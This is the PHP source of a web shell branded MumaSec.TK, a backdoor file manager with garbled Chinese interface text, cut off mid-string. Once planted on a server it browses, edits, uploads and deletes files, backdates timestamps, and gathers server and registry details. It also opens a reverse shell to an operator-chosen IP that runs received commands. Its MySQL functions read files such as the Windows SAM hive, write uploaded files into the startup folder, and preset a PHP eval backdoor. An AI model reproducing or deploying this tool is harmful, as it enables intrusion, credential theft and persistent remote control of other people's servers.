<?php
;//������֤���룡
$shellname='�й�ľ����Դ��-WwW.MumaSec.TK ';//�����޸ı��⣡
define('myaddress',__FILE__);
error_reporting(E_ERROR | E_PARSE);
header("content-Type: text/html; charset=gb2312");
@set_time_limit(0);

ob_start();
define('envlpass',$password);
define('shellname',$shellname);
define('myurl',$myurl);
if(@get_magic_quotes_gpc()){
	foreach($_POST as $k => $v) $_POST[$k] = stripslashes($v);
	foreach($_GET as $k => $v) $_GET[$k] = stripslashes($v);
}

/*---End Login---*/
if(isset($_GET['down'])) do_down($_GET['down']);
if(isset($_GET['pack'])){
	$dir = do_show($_GET['pack']);
	$zip = new eanver($dir);
	$out = $zip->out;
	do_download($out,"eanver.tar.gz");
}
if(isset($_GET['unzip'])){
	css_main();
	start_unzip($_GET['unzip'],$_GET['unzip'],$_GET['todir']);
	exit;
}

define('root_dir',str_replace('\\','/',dirname(myaddress)).'/');
define('run_win',substr(PHP_OS, 0, 3) == "WIN");
define('my_shell',str_path(root_dir.$_SERVER['SCRIPT_NAME']));
$eanver = isset($_GET['eanver']) ? $_GET['eanver'] : "";
$doing = isset($_POST['doing']) ? $_POST['doing'] : "";
$path = isset($_GET['path']) ? $_GET['path'] : root_dir;
$name = isset($_POST['name']) ? $_POST['name'] : "";
$img = isset($_GET['img']) ? $_GET['img'] : "";
$p = isset($_GET['p']) ? $_GET['p'] : "";
$pp = urlencode(dirname($p));
if($img) css_img($img);
if($eanver == "phpinfo") die(phpinfo());
if($eanver == 'logout'){
	setcookie('envlpass',null);
	die('<meta http-equiv="refresh" content="0;URL=?">');
}

$class = array(
"��Ϣ����" => array("upfiles" => "�ϴ��ļ�","phpinfo" => "������Ϣ","info_f" => "ϵͳ��Ϣ","eval" => "ִ��PHP�ű�"),
"��Ȩ����" => array("sqlshell" => "ִ��SQLִ��","mysql_exec" => "MYSQL����","myexp" => "MYSQL��Ȩ","servu" => "Serv-U��Ȩ","nc" => "NC����","downloader" => "�ļ�����","port" => "�˿�ɨ��"),
"��������" => array("guama" => "������������","tihuan" => "�����滻����","scanfile" => "���������ļ�","scanphp" => "��������ľ��"),
"�ű����" => array("getcode" => "��ȡ��ҳԴ��")
);
$msg = array("0" => "����ɹ�","1" => "����ʧ��","2" => "�ϴ��ɹ�","3" => "�ϴ�ʧ��","4" => "�޸ĳɹ�","5" => "�޸�ʧ��","6" => "ɾ���ɹ�","7" => "ɾ��ʧ��");
css_main();
switch($eanver){
	case "left":
	css_left();
		html_n("<dl><dt><a href=\"#\" onclick=\"showHide('items1');\" target=\"_self\">");
		html_img("title");html_n(" ����Ӳ��</a></dt><dd id=\"items1\" style=\"display:block;\"><ul>");
    $ROOT_DIR = File_Mode();
    html_n("<li><a title='$ROOT_DIR' href='?eanver=main&path=$ROOT_DIR' target='main'>��վ��Ŀ¼</a></li>");
	html_n("<li><a href='?eanver=main' target='main'>������Ŀ¼</a></li>");
	for ($i=66;$i<=90;$i++){$drive= chr($i).':';
    if (is_dir($drive."/")){$vol=File_Str("vol $drive");if(empty($vol))$vol=$drive;
    html_n("<li><a title='$drive' href='?eanver=main&path=$drive' target='main'>���ش���($drive)</a></li>");}}
	html_n("</ul></dd></dl>");
	$i = 2;
	foreach($class as $name => $array){
		html_n("<dl><dt><a href=\"#\" onclick=\"showHide('items$i');\" target=\"_self\">");
		html_img("title");html_n(" $name</a></dt><dd id=\"items$i\" style=\"display:block;\"><ul>");
		foreach($array as $url => $value){
			html_n("<li><a href=\"?eanver=$url\" target='main'>$value</a></li>");
		}
		html_n("</ul></dd></dl>");
		$i++;
	}
	html_n("<dl><dt><a href=\"#\" onclick=\"showHide('items$i');\" target=\"_self\">");
	html_img("title");html_n(" ��������</a></dt><dd id=\"items$i\" style=\"display:block;\"><ul>");
	html_n("<li><a title='��ɱ����' href='http://www.mumasec.tk/' target=\"main\">��ɱ����</a></li>");
    html_n("<li><a title='��ȫ�˳�' href='?eanver=logout' target=\"main\">��ȫ�˳�</a></li>");
	html_n("</ul></dd></dl>");
	html_n("</div>");
	break;
	
	case "main":
	css_js("1");
	$dir = @dir($path);
	$REAL_DIR = File_Str(realpath($path));
	if(!empty($_POST['actall'])){echo '<div class="actall">'.File_Act($_POST['files'],$_POST['actall'],$_POST['inver'],$REAL_DIR).'</div>';}
	$NUM_D = $NUM_F = 0;
	if(!$_SERVER['SERVER_NAME']) $GETURL = ''; else $GETURL = 'http://'.$_SERVER['SERVER_NAME'].'/';
	$ROOT_DIR = File_Mode();
	html_n("<table width=\"100%\" border=0 bgcolor=\"#555555\"><tr><td><form method='GET'>��ַ:<input type='hidden' name='eanver' value='main'>");
	html_n("<input type='text' size='80' name='path' value='$path'> <input type='submit' value='ת��'></form>");
	html_n("<br><form method='POST' enctype=\"multipart/form-data\" action='?eanver=editr&p=".urlencode($path)."'>");
	html_n("<input type=\"button\" value=\"�½��ļ�\" onclick=\"rusurechk('newfile.php','?eanver=editr&p=".urlencode($path)."&refile=1&name=');\"> <input type=\"button\" value=\"�½�Ŀ¼\" onclick=\"rusurechk('newdir','?eanver=editr&p=".urlencode($path)."&redir=1&name=');\">");
	html_input("file","upfilet","","&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ");
	html_input("submit","uploadt","�ϴ�");
	if(!empty($_POST['newfile'])){
		if(isset($_POST['bin'])) $bin = $_POST['bin']; else $bin = "wb";
        if (substr(PHP_VERSION,0,1)>=5){if(($_POST['charset']=='GB2312') or ($_POST['charset']=='GBK')){}else{$_POST['txt'] = iconv("gb2312//IGNORE",$_POST['charset'],$_POST['txt']);}}
		echo do_write($_POST['newfile'],$bin,$_POST['txt']) ? '<br>'.$_POST['newfile'].' '.$msg[0] : '<br>'.$_POST['newfile'].' '.$msg[1];
		@touch($_POST['newfile'],@strtotime($_POST['time']));
	}
	html_n('</form></td></tr></table><form method="POST" name="fileall" id="fileall" action="?eanver=main&path='.$path.'"><table width="100%" border=0 bgcolor="#555555"><tr height="25"><td width="45%"><b>');
	html_a('?eanver=main&path='.uppath($path),'<b>�ϼ�Ŀ¼</b>');
	html_n('</b></td><td align="center" width="10%"><b>����</b></td><td align="center" width="5%">');
	html_n('<b>�ļ�����</b></td><td align="center" width="10%"><b>�޸�ʱ��</b></td><td align="center" width="10%"><b>�ļ���С</b></td></tr>');
	while($dirs = @$dir->read()){
		if($dirs == '.' or $dirs == '..') continue;
		$dirpath = str_path("$path/$dirs");
		if(is_dir($dirpath)){
			$perm = substr(base_convert(fileperms($dirpath),10,8),-4);
			$filetime = @date('Y-m-d H:i:s',@filemtime($dirpath));
			$dirpath = urlencode($dirpath);
			html_n('<tr height="25"><td><input type="checkbox" name="files[]" value="'.$dirs.'">');
			html_img("dir");
			html_a('?eanver=main&path='.$dirpath,$dirs);
			html_n('</td><td align="center">');
			html_n("<a href=\"#\" onClick=\"rusurechk('$dirs','?eanver=rename&p=$dirpath&newname=');return false;\">����</a>");
			html_n("<a href=\"#\" onClick=\"rusuredel('$dirs','?eanver=deltree&p=$dirpath');return false;\">ɾ��</a> ");
			html_a('?pack='.$dirpath,'���');
			html_n('</td><td align="center">');
			html_a('?eanver=perm&p='.$dirpath.'&chmod='.$perm,$perm);
			html_n('</td><td align="center">'.$filetime.'</td><td align="right">');
			html_n('</td></tr>');
			$NUM_D++;
		}
	}
	@$dir->rewind();
	while($files = @$dir->read()){
		if($files == '.' or $files == '..') continue;
		$filepath = str_path("$path/$files");
		if(!is_dir($filepath)){
			$fsize = @filesize($filepath);
			$fsize = File_Size($fsize);
			$perm  = substr(base_convert(fileperms($filepath),10,8),-4);
			$filetime = @date('Y-m-d H:i:s',@filemtime($filepath));
			$Fileurls = str_replace(File_Str($ROOT_DIR.'/'),$GETURL,$filepath);
			$todir=$ROOT_DIR.'/zipfile';
			$filepath = urlencode($filepath);
			$it=substr($filepath,-3);
			html_n('<tr height="25"><td><input type="checkbox" name="files[]" value="'.$files.'">');
			html_img(css_showimg($files));
			html_a($Fileurls,$files);
			html_n('</td><td align="center">');
            if(($it=='.gz') or ($it=='zip') or ($it=='tar') or ($it=='.7z'))
			   html_a('?unzip='.$filepath,'��ѹ','title="��ѹ'.$files.'" onClick="rusurechk(\''.$todir.'\',\'?unzip='.$filepath.'&todir=\');return false;"');
			else
               html_a('?eanver=editr&p='.$filepath,'�༭','title="�༭'.$files.'"');

			html_n("<a href=\"#\" onClick=\"rusurechk('$files','?eanver=rename&p=$filepath&newname=');return false;\">����</a>");
			html_n("<a href=\"#\" onClick=\"rusuredel('$files','?eanver=del&p=$filepath');return false;\">ɾ��</a> ");
			html_n("<a href=\"#\" onClick=\"rusurechk('".urldecode($filepath)."','?eanver=copy&p=$filepath&newcopy=');return false;\">����</a>");
			html_n('</td><td align="center">');
			html_a('?eanver=perm&p='.$filepath.'&chmod='.$perm,$perm);
			html_n('</td><td align="center">'.$filetime.'</td><td align="right">');
			html_a('?down='.$filepath,$fsize,'title="����'.$files.'"');
			html_n('</td></tr>');
			$NUM_F++;
		}
	}
	@$dir->close();
	if(!$Filetime) $Filetime = gmdate('Y-m-d H:i:s',time() + 3600 * 8);
print<<<END
</table>
<div class="actall"> <input type="hidden" id="actall" name="actall" value="undefined"> 
<input type="hidden" id="inver" name="inver" value="undefined"> 
<input name="chkall" value="on" type="checkbox" onclick="CheckAll(this.form);"> 
<input type="button" value="����" onclick="SubmitUrl('������ѡ�ļ���·��: ','{$REAL_DIR}','a');return false;"> 
<input type="button" value="ɾ��" onclick="Delok('��ѡ�ļ�','b');return false;"> 
<input type="button" value="����" onclick="SubmitUrl('�޸���ѡ�ļ�����ֵΪ: ','0666','c');return false;"> 
<input type="button" value="ʱ��" onclick="CheckDate('{$Filetime}','d');return false;"> 
<input type="button" value="���" onclick="SubmitUrl('�����������ѡ�ļ�������Ϊ: ','{$_SERVER['SERVER_NAME']}.tar.gz','e');return false;">
Ŀ¼({$NUM_D}) / �ļ�({$NUM_F})</div> 
</form> 
END;
	break;
	
	case "editr":
	css_js("2");
	if(!empty($_POST['uploadt'])){
		echo @copy($_FILES['upfilet']['tmp_name'],str_path($p.'/'.$_FILES['upfilet']['name'])) ? html_a("?eanver=main",$_FILES['upfilet']['name'].' '.$msg[2]) : msg($msg[3]);
		die('<meta http-equiv="refresh" content="1;URL=?eanver=main&path='.urlencode($p).'">');
	}
	if(!empty($_GET['redir'])){
        $name=$_GET['name'];
		$newdir = str_path($p.'/'.$name);
		@mkdir($newdir,0777) ? html_a("?eanver=main",$name.' '.$msg[0]) : msg($msg[1]);
		die('<meta http-equiv="refresh" content="1;URL=?eanver=main&path='.urlencode($p).'">');
	}

	if(!empty($_GET['refile'])){
        $name=$_GET['name'];
		$jspath=urlencode($p.'/'.$name);
		$pp = urlencode($p);
		$p = str_path($p.'/'.$name);
		$FILE_CODE = "";
		$charset= 'GB2312';
        $FILE_TIME =date('Y-m-d H:i:s',time()+3600*8);
		if(@file_exists($p)) echo '����Ŀ¼����"ͬ��"�ļ�<br>';
	}else{
		$jspath=urlencode($p);
		$FILE_TIME = date('Y-m-d H:i:s',filemtime($p));
        $FILE_CODE=@file_get_contents($p);
	     if (substr(PHP_VERSION,0,1)>=5){
            if(empty($_GET['charset'])){
			   if(TestUtf8($FILE_CODE)>1){$charset= 'UTF-8';$FILE_CODE = iconv("UTF-8","gb2312//IGNORE",$FILE_CODE);}else{$charset= 'GB2312';}
			  }else{
			   if($_GET['charset']=='GB2312'){$charset= 'GB2312';}else{$charset= $_GET['charset'];$FILE_CODE = iconv($_GET['charset'],"gb2312//IGNORE",$FILE_CODE);}
			  }
		  }
        $FILE_CODE = htmlspecialchars($FILE_CODE);
	}
print<<<END
<div class="actall">��������: <input name="searchs" type="text" value="{$dim}" style="width:500px;">
<input type="button" value="����" onclick="search(searchs.value)"></div>
<form method='POST' id="editor"  action='?eanver=main&path={$pp}'>
<div class="actall">
<input type="text" name="newfile"  id="newfile" value="{$p}" style="width:750px;">ָ�����룺<input name="charset" id="charset" value="{$charset}" Type="text" style="width:80px;" onkeydown="if(event.keyCode==13)window.location='?eanver=editr&p={$jspath}&charset='+this.value;">
<input type="button" value="ѡ��" onclick="window.location='?eanver=editr&p={$jspath}&charset='+this.form.charset.value;" style="width:50px;"> 
END;
html_select(array("GB2312" => "GB2312","UTF-8" => "UTF-8","BIG5" => "BIG5","EUC-KR" => "EUC-KR","EUC-JP" => "EUC-JP","SHIFT-JIS" => "SHIFT-JIS","WINDOWS-874" => "WINDOWS-874","ISO-8859-1" => "ISO-8859-1"),$charset,"onchange=\"window.location='?eanver=editr&p={$jspath}&charset='+options[selectedIndex].value;\"");
print<<<END
</div>
<div class="actall"><textarea name="txt" style="width:100%;height:380px;">{$FILE_CODE}</textarea></div>
<div class="actall">�ļ��޸�ʱ�� <input type="text" name="time" id="mtime" value="{$FILE_TIME}" style="width:150px;"> <input type="checkbox" name="bin" value="wb+" size="" checked>�Զ�������ʽ�����ļ�(����ʹ��)</div>
<div class="actall"><input type="button" value="����" onclick="CheckDate();" style="width:80px;"> <input name='reset' type='reset' value='����'> 
<input type="button" value="����" onclick="window.location='?eanver=main&path={$pp}';" style="width:80px;"></div>
</form>
END;
	break;
	
	case "rename":
	html_n("<tr><td>");
	$newname = urldecode($pp).'/'.urlencode($_GET['newname']);
	@rename($p,$newname) ? html_a("?eanver=main&path=$pp",urlencode($_GET['newname']).' '.$msg[4]) : msg($msg[5]);
	die('<meta http-equiv="refresh" content="1;URL=?eanver=main&path='.$pp.'">');
	break;
	
	case "deltree":
	html_n("<tr><td>");
	do_deltree($p) ? html_a("?eanver=main&path=$pp",$p.' '.$msg[6]) : msg($msg[7]);
	die('<meta http-equiv="refresh" content="1;URL=?eanver=main&path='.$pp.'">');
	break;
	
	case "del":
	html_n("<tr><td>");
	@unlink($p) ? html_a("?eanver=main&path=$pp",$p.' '.$msg[6]) : msg($msg[7]);
	die('<meta http-equiv="refresh" content="1;URL=?eanver=main&path='.$pp.'">');
	break;
	
	case "copy":
	html_n("<tr><td>");
	$newpath = explode('/',$_GET['newcopy']);
	$pathr[0] = $newpath[0];
	for($i=1;$i < count($newpath);$i++){
		$pathr[] = urlencode($newpath[$i]);
	}
	$newcopy = implode('/',$pathr);
	@copy($p,$newcopy) ? html_a("?eanver=main&path=$pp",$newcopy.' '.$msg[4]) : msg($msg[5]);
	die('<meta http-equiv="refresh" content="1;URL=?eanver=main&path='.$pp.'">');
	break;
	
	case "perm":
	html_n("<form method='POST'><tr><td>".$p.' ����Ϊ: ');
	if(is_dir($p)){
		html_select(array("0777" => "0777","0755" => "0755","0555" => "0555"),$_GET['chmod']);
	}else{
		html_select(array("0666" => "0666","0644" => "0644","0444" => "0444"),$_GET['chmod']);
	}
	html_input("submit","save","�޸�");
	back();
	if($_POST['class']){
		switch($_POST['class']){
			case "0777": $change = @chmod($p,0777); break;
			case "0755": $change = @chmod($p,0755); break;
			case "0555": $change = @chmod($p,0555); break;
			case "0666": $change = @chmod($p,0666); break;
			case "0644": $change = @chmod($p,0644); break;
			case "0444": $change = @chmod($p,0444); break;
		}
		$change ? html_a("?eanver=main&path=$pp",$msg[4]) : msg($msg[5]);
		die('<meta http-equiv="refresh" content="1;URL=?eanver=main&path='.$pp.'">');
	}
	html_n("</td></tr></form>");
	break;

    case "info_f":
	$dis_func = get_cfg_var("disable_functions");
	$upsize = get_cfg_var("file_uploads") ? get_cfg_var("upload_max_filesize") : "�������ϴ�";
	$adminmail = (isset($_SERVER['SERVER_ADMIN'])) ? "<a href=\"mailto:".$_SERVER['SERVER_ADMIN']."\">".$_SERVER['SERVER_ADMIN']."</a>" : "<a href=\"mailto:".get_cfg_var("sendmail_from")."\">".get_cfg_var("sendmail_from")."</a>";
	if($dis_func == ""){$dis_func = "No";}else{$dis_func = str_replace(" ","<br>",$dis_func);$dis_func = str_replace(",","<br>",$dis_func);}
	$phpinfo = (!eregi("phpinfo",$dis_func)) ? "Yes" : "No";
	$info = array(
		array("������ʱ��",date("Y��m��d�� h:i:s",time())),
		array("����������","<a href=\"http://".$_SERVER['SERVER_NAME']."\" target=\"_blank\">".$_SERVER['SERVER_NAME']."</a>"),
		array("������IP��ַ",gethostbyname($_SERVER['SERVER_NAME'])),
		array("����������ϵͳ",PHP_OS),
		array("����������ϵͳ���ֱ���",$_SERVER['HTTP_ACCEPT_LANGUAGE']),
		array("��������������",$_SERVER['SERVER_SOFTWARE']),
		array("���IP",$_SERVER["REMOTE_ADDR"]),
		array("Web����˿�",$_SERVER['SERVER_PORT']),
		array("PHP���з�ʽ",strtoupper(php_sapi_name())),
		array("PHP�汾",PHP_VERSION),
		array("�����ڰ�ȫģʽ",Info_Cfg("safemode")),
		array("����������Ա",$adminmail),
		array("���ļ�·��",myaddress),
		array("����ʹ�� URL ���ļ� allow_url_fopen",Info_Cfg("allow_url_fopen")),
		array("����ʹ��curl_exec",Info_Fun("curl_exec")),
		array("����̬�������ӿ� enable_dl",Info_Cfg("enable_dl")),
		array("��ʾ������Ϣ display_errors",Info_Cfg("display_errors")),
		array("�Զ�����ȫ�ֱ��� register_globals",Info_Cfg("register_globals")),
		array("magic_quotes_gpc",Info_Cfg("magic_quotes_gpc")),
		array("�����������ʹ���ڴ��� memory_limit",Info_Cfg("memory_limit")),
		array("POST����ֽ��� post_max_size",Info_Cfg("post_max_size")),
		array("��������ϴ��ļ� upload_max_filesize",$upsize),
		array("���������ʱ�� max_execution_time",Info_Cfg("max_execution_time")."��"),
		array("�����õĺ��� disable_functions",$dis_func),
		array("phpinfo()",$phpinfo),
		array("Ŀǰ���п���ռ�diskfreespace",intval(diskfreespace(".") / (1024 * 1024)).'Mb'),
		array("ͼ�δ��� GD Library",Info_Fun("imageline")),
		array("IMAP�����ʼ�ϵͳ",Info_Fun("imap_close")),
		array("MySQL���ݿ�",Info_Fun("mysql_close")),
		array("SyBase���ݿ�",Info_Fun("sybase_close")),
		array("Oracle���ݿ�",Info_Fun("ora_close")),
		array("Oracle 8 ���ݿ�",Info_Fun("OCILogOff")),
		array("PREL�����﷨ PCRE",Info_Fun("preg_match")),
		array("PDF�ĵ�֧��",Info_Fun("pdf_close")),
		array("Postgre SQL���ݿ�",Info_Fun("pg_close")),
		array("SNMP�������Э��",Info_Fun("snmpget")),
		array("ѹ���ļ�֧��(Zlib)",Info_Fun("gzclose")),
		array("XML����",Info_Fun("xml_set_object")),
		array("FTP",Info_Fun("ftp_login")),
		array("ODBC���ݿ�����",Info_Fun("odbc_close")),
		array("Session֧��",Info_Fun("session_start")),
		array("Socket֧��",Info_Fun("fsockopen")),
	);
	$shell = new COM("WScript.Shell") or die("This thing requires Windows Scripting Host");
	echo '<table width="100%" border="0">';
	for($i = 0;$i < count($info);$i++){echo '<tr><td width="40%">'.$info[$i][0].'</td><td>'.$info[$i][1].'</td></tr>'."\n";}
try{$registry_proxystring = $shell->RegRead("HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\Wds\\rdpwd\\Tds\\tcp\PortNumber");
$Telnet = $shell->RegRead("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\TelnetServer\\1.0\\TelnetPort");
$PcAnywhere = $shell->RegRead("HKEY_LOCAL_MACHINE\\SOFTWARE\\Symantec\\pcAnywhere\\CurrentVersion\\System\\TCPIPDataPort");
}catch(Exception $e){}
    echo '<tr><td width="40%">Terminal Service�˿�Ϊ</td><td>'.$registry_proxystring.'</td></tr>'."\n";
	echo '<tr><td width="40%">Telnet�˿�Ϊ</td><td>'.$Telnet.'</td></tr>'."\n";
	echo '<tr><td width="40%">PcAnywhere�˿�Ϊ</td><td>'.$PcAnywhere.'</td></tr>'."\n";
	echo '</table>';
	break;

	case "nc":
	$M_ip = isset($_POST['mip']) ? $_POST['mip'] : $_SERVER["REMOTE_ADDR"];
	$B_port = isset($_POST['bport']) ? $_POST['bport'] : '1019';
print<<<END
<form method="POST">
<div class="actall">ʹ�÷�����<br>
			�����Լ���������"nc -l -p 1019"<br>
			Ȼ���ڴ���д����Ե�IP,�����ӣ�</div>
<div class="actall">���IP <input type="text" name="mip" value="{$M_ip}" style="width:100px;"> �˿ں� <input type="text" name="bport" value="{$B_port}" style="width:50px;"></div>
<div class="actall"><input type="submit" value="����" style="width:80px;"></div>
</form>
END;
	if((!empty($_POST['mip'])) && (!empty($_POST['bport'])))
	{
	echo '<div class="actall">';
		 $mip=$_POST['mip'];
		 $bport=$_POST['bport'];
		 $fp=fsockopen($mip , $bport , $errno, $errstr);
		 if (!$fp){
		     $result = "Error: could not open socket connection";
		    }else {
		 fputs ($fp ,"\n*********************************************\n 
		              hacking url:http://www.mumasec.tk/ is ok!        
			          \n*********************************************\n\n");
	     while(!feof($fp)){ 
         fputs ($fp," [r00t@H4c3ing:/root]# ");
         $result= fgets ($fp, 4096);
         $message=`$result`;
         fputs ($fp,"--> ".$message."\n");
                          }
         fclose ($fp);
		       }
    echo '</div>';
    }
	break;


	case "sqlshell":
	$MSG_BOX = '';
	$mhost = 'localhost'; $muser = 'root'; $mport = '3306'; $mpass = ''; $mdata = 'mysql'; $msql = 'select version();';
	if(isset($_POST['mhost']) && isset($_POST['muser']))
	{
		$mhost = $_POST['mhost']; $muser = $_POST['muser']; $mpass = $_POST['mpass']; $mdata = $_POST['mdata']; $mport = $_POST['mport'];
		if($conn = mysql_connect($mhost.':'.$mport,$muser,$mpass)) @mysql_select_db($mdata);
		else $MSG_BOX = '����MYSQLʧ��';
	}
	$downfile = 'c:/windows/repair/sam';
	if(!empty($_POST['downfile']))
	{
		$downfile = File_Str($_POST['downfile']);
		$binpath = bin2hex($downfile);
		$query = 'select load_file(0x'.$binpath.')';
		if($result = @mysql_query($query,$conn))
		{
			$k = 0; $downcode = '';
			while($row = @mysql_fetch_array($result)){$downcode .= $row[$k];$k++;}
			$filedown = basename($downfile);
			if(!$filedown) $filedown = 'envl.tmp';
			$array = explode('.', $filedown);
			$arrayend = array_pop($array);
			header('Content-type: application/x-'.$arrayend);
			header('Content-Disposition: attachment; filename='.$filedown);
			header('Content-Length: '.strlen($downcode));
			echo $downcode;
			exit;
		}
		else $MSG_BOX = '�����ļ�ʧ��';
	}
	$o = isset($_GET['o']) ? $_GET['o'] : '';
print<<<END
<form method="POST" name="nform" id="nform">
<center><div class="actall"><a href="?eanver=sqlshell">[MYSQLִ�����]</a> 
<a href="?eanver=sqlshell&o=u">[MYSQL�ϴ��ļ�]</a> 
<a href="?eanver=sqlshell&o=d">[MYSQL�����ļ�]</a></div>
<div class="actall">
��ַ <input type="text" name="mhost" value="{$mhost}" style="width:110px">
�˿� <input type="text" name="mport" value="{$mport}" style="width:110px">
�û� <input type="text" name="muser" value="{$muser}" style="width:110px">
���� <input type="text" name="mpass" value="{$mpass}" style="width:110px">
���� <input type="text" name="mdata" value="{$mdata}" style="width:110px">
</div>
<div class="actall" style="height:220px;">
END;
if($o == 'u')
{
	$uppath = 'C:/Documents and Settings/All Users/����ʼ���˵�/����/����/exp.vbs';
	if(!empty($_POST['uppath']))
	{
		$uppath = $_POST['uppath'];
		$query = 'Create TABLE a (cmd text NOT NULL);';
		if(@mysql_query($query,$conn))
		{
			if($tmpcode = File_Read($_FILES['upfile']['tmp_name'])){$filecode = bin2hex(File_Read($tmpcode));}
			else{$tmp = File_Str(dirname(myaddress)).'/upfile.tmp';if(File_Up($_FILES['upfile']['tmp_name'],$tmp)){$filecode = bin2hex(File_Read($tmp));@unlink($tmp);}}
			$query = 'Insert INTO a (cmd) VALUES(CONVERT(0x'.$filecode.',CHAR));';
			if(@mysql_query($query,$conn))
			{
				$query = 'SELECT cmd FROM a INTO DUMPFILE \''.$uppath.'\';';
				$MSG_BOX = @mysql_query($query,$conn) ? '�ϴ��ļ��ɹ�' : '�ϴ��ļ�ʧ��';
			}
			else $MSG_BOX = '������ʱ��ʧ��';
			@mysql_query('Drop TABLE IF EXISTS a;',$conn);
		}
		else $MSG_BOX = '������ʱ��ʧ��';
	}
print<<<END
<br><br>�ϴ�·�� <input type="text" name="uppath" value="{$uppath}" style="width:500px">
<br><br>ѡ���ļ� <input type="file" name="upfile" style="width:500px;height:22px;">
</div><div class="actall"><input type="submit" value="�ϴ�" style="width:80px;">
END;
}
elseif($o == 'd')
{
print<<<END
<br><br><br>�����ļ� <input type="text" name="downfile" value="{$downfile}" style="width:500px">
</div><div class="actall"><input type="submit" value="����" style="width:80px;">
END;
}
else
{
	if(!empty($_POST['msql']))
	{
		$msql = $_POST['msql'];
		if($result = @mysql_query($msql,$conn))
		{
			$MSG_BOX = 'ִ��SQL���ɹ�<br>';
			$k = 0;
			while($row = @mysql_fetch_array($result)){$MSG_BOX .= $row[$k];$k++;}
		}
		else $MSG_BOX .= mysql_error();
	}
print<<<END
<script language="javascript">
function nFull(i){
	Str = new Array(11);
	Str[0] = "select version();";
	Str[1] = "select load_file(0x633A5C5C77696E646F77735C73797374656D33325C5C696E65747372765C5C6D657461626173652E786D6C) FROM user into outfile 'D:/web/iis.txt'";
	Str[2] = "select '<?php eval(\$_POST[cmd]);?>